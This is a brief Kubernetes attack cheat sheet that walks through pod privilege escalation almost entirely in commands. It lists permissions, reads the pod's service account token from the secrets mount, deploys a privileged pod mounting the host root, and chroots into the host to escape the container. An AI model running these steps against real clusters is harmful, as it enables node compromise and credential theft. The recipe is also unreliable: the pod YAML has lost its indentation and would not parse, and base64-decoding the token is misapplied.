# Pod Privilege Escalation

#### 1)  Enumerating current permissions

    kubectl auth can-i --list

#### 2)  Stealing service account tokens

    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    echo $TOKEN | base64 -d

#### 3) Creating a privileged breakout pod

    kubectl apply -f - <<EOF
    apiVersion: v1
    kind: Pod
    metadata:
    name: breakout-pod
    spec:
    hostNetwork: true
    hostPID: true
    hostIPC: true
    containers:
    - name: breakout
    image: alpine
    command: ["/bin/sh"]
    stdin: true
    tty: true
    securityContext:
    privileged: true
    volumeMounts:
    - name: host-root
    mountPath: /host
    volumes:
    - name: host-root
    hostPath:
    path: /
    EOF

#### 4) Escaping to the host system

    kubectl exec -it breakout-pod -- chroot /host
